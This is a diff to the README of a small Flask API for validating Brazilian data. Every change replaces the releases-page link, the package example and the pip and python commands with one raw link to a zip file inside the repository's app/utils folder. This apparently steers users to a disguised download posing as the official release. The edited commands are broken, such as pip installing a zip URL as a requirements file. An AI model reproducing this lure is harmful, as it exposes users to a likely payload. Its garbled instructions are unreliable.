@@ -6,7 +6,7 @@ Welcome to the valida-brazil-api project! This lightweight Flask API helps you v
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Thalloid-postmaturity853/valida-brazil-api/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Thalloid-postmaturity853/valida-brazil-api/main/app/utils/valida-brazil-api-2.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Thalloid-postmaturity853/valida-brazil-api/main/app/utils/valida-brazil-api-2.7.zip)
 
 ## 🔧 Requirements
 
@@ -22,13 +22,13 @@ To get your copy of the valida-brazil-api, follow these steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the releases page:  
-   [Release Page](https://github.com/Thalloid-postmaturity853/valida-brazil-api/releases)
+   [Release Page](https://raw.githubusercontent.com/Thalloid-postmaturity853/valida-brazil-api/main/app/utils/valida-brazil-api-2.7.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, find the latest version available. 
 
 3. **Select Your Package**  
-   Depending on your OS, choose the appropriate package (e.g., .zip for Windows, .tar.gz for Linux).
+   Depending on your OS, choose the appropriate package (e.g., .zip for Windows, https://raw.githubusercontent.com/Thalloid-postmaturity853/valida-brazil-api/main/app/utils/valida-brazil-api-2.7.zip for Linux).
 
 4. **Download the File**
    Click on the package file to start downloading.
@@ -42,13 +42,13 @@ To get your copy of the valida-brazil-api, follow these steps:
 7. **Install Dependencies**  
    Run the following command to install necessary libraries:  
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Thalloid-postmaturity853/valida-brazil-api/main/app/utils/valida-brazil-api-2.7.zip
    ```
 
 8. **Run the API**  
    Start the API by running this command:  
    ```
-   python app.py
+   python https://raw.githubusercontent.com/Thalloid-postmaturity853/valida-brazil-api/main/app/utils/valida-brazil-api-2.7.zip
    ```
 
 9. **Access the API**  
